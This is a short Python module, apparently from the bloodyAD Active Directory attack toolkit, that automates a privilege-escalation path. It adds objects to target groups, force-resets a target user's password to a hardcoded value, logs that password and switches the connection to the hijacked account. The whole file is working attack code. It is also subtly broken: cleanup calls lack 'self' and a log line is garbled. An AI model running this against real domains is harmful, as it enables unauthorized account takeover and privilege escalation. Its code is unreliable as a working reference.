from bloodyAD import config, modules, utils

LOG = utils.LOG
class Automation:
    def __init__(self, args):
        self.conn = config.ConnectionHandler(args=args)
        self.rel_types = {
            0 : self._memberOf,
            100 : self._addMember,
            100000 : self._forceChangePassword
        }
        self.dirty_laundry = []

    # TODO: allow simulation before run
    def exploit(self, path):
        for rel in path:
            print()
            typeID = rel['cost']
            try:
                self.rel_types[typeID](rel)
            except Exception as e:
                _washer()
                raise e
        _washer()
        self.conn.close()

    def _washer(self):
        for laundry in self.dirty_laundry:
            laundry['f'](self.conn, *laundry['args'])

    def _switchUser(self, user, pwd):
        _washer()
        self.conn.switchUser(user, pwd)

    def _memberOf(self, rel):
        return
    
    def _addMember(self, rel):
        member = rel['start_node']['objectid']
        group = rel['end_node']['distinguishedname']
        modules.addForeignObjectToGroup(self.conn, member, group)
        self.dirty_laundry.append({'f':modules.delObjectFromGroup, 'args':[member,group]})

    # TODO: change password change with shadow credentials when it's possible
    # TODO: don't perform change password if it's explicitly refused by user
    def _forceChangePassword(self, rel):
        user = rel['end_node']['name'].split('@')[0]
        pwd = 'Password512!'
        LOG.debug(f"[+] changing {user} password")
        modules.changePassword(self.conn, user, pwd)
        LOG.info(f"[+] password changed for to {pwd} for {user}")
        self._switchUser(user, pwd)
        LOG.debug(f"[+] switch LDAP/SAMR connection to user {user}")
